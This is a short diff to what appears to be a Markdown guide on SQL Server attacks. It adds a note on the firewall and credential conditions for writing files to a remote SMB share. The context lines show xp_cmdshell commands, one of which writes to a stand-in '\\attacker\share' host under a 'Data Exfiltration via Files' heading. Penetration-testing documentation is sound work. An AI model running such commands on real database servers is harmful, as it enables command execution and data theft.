@@ -219,6 +219,8 @@ EXEC xp_cmdshell 'echo test > %TEMP%\test.txt';
 EXEC xp_cmdshell 'echo test > \\attacker\share\test.txt';
 ```
 
+**Note:** UNC paths require the SQL Server host to have network connectivity to the target SMB share, appropriate firewall rules (outbound port 445), and valid credentials or anonymous access. This will fail in network-isolated environments.
+
 ### Data Exfiltration via Files
 
 ```sql
